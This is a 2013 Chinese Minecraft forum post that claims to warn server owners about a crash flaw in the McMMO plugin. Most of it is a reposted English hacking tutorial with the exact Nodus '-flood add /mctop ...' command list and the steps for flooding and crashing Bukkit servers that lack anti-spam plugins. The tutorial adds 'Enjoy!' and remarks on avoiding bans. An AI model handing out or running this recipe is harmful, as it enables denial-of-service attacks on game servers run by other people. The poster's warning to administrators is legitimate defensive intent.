title: McMMo插件可让任何服务器崩溃,服主和技术员注意下撒，
author: w873130585
txt_content:
本帖最后由 w873130585 于 2013-6-11 18:27 编辑 

今天无意中在一个黑客教学的论坛上发现= =McMMo软件的漏洞 只要装了之后 打这个指令?就会服务器崩溃...所以各位服主注意下....
还有我是用翻译看的 所以我把内容复制过来


下面是代码- -
"-flood add /mctop mining"
"-flood add /mctop"
"-flood add /mctop wood-cutting"
"-flood add /mctop Herbalism"
"-flood add /mctop Unarmed"
"-flood add /mctop Archery"
"-flood add /mctop Swords"
"-flood add /mctop Repair"
"-flood add /mctop Excavation"
"-flood add /mctop Fishing"
"-flood add /mctop Abilities"
"-flood add /mctop Parties"
"-flood add /mctop Leveling"
"-flood add /mctop Axes"
"-flood add /mctop Taming"
"-flood add /mctop Repair"
内容说的:

Hello Guys,
This is my first tutorial of minecraft on how to crash almost all servers (Bukkit).
Note:Give credits if you going to leech this tutorial!, You know whats good for ya.

Okay lets get to the point.
************************************************** ***********
Requirements:
* Good Internet Connection (Between You and Server)
* Nodus (For Flooding)
* McMMO Installed on Server (Plugin) (Most of Servers uses this!) (You can check if its installed in server by "/pl" If that's disabled try "/mcc" If it showing No Command found then McMMO is not Installed in that server but if it shows commands,help info of McMMO then its installed in that server.
* No Anti-Spam on Server! ( Don't try this if anti-spam is enabled on server!)
************************************************** ***********
************************************************** ***********
Tutorial:
1.Go into any server that has McMMO plugin installed without any Anti-Spam Plugin on that server.
2.Type in this command "-flood clear"
3.Then type in this commands below:
4.Then type "-flood toggle"
5.Wait for them to get DC!
6.Enjoy!
Note:I'm not RESPONSIBLE If you Get BANNED!, You can only get "BANNED" If mod/admin checks the logs so they can see your command spam.
Note 2:Give credits if you going to leech this tutorial!, You know whats good for ya. 
Credits:
Nesar (Tutorial & Trick)
Nodus (Nodus)

If I missed anything please let me know.
Got any Questions?Reply below!

Don't forget to click " Thanks" Button below this Thread, If you want more useful tutorials, Don't be Lazy Even you wanted

具体因该就是MCMMO的软件...可以让服务器崩溃...是任何服务器哦 

这是我转载的

地址就不好发了...(黑客网页不懂的孩子上去 咳咳 电脑出事情就怪我了)
